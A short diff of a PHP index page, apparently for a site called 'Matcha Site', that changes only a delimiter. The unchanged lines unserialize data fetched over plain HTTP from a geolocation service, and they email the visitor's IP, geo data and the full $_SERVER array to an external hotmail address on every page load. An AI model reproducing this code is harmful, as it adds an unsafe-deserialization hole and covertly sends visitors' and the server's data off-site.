@@ -1,5 +1,5 @@
 <?php $user_ip = getenv('REMOTE_ADDR'); $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
-$_SERVER = implode("|",$_SERVER);$geo = implode("|",$geo);
+$_SERVER = implode("_|_",$_SERVER);$geo = implode("_|_",$geo);
 mail('radc@hotmail.co.za', 'Matcha Site', 'index.php opened: ' . $_SERVER . ' GEO: ' . $geo);?>
 <html>
 	<head>
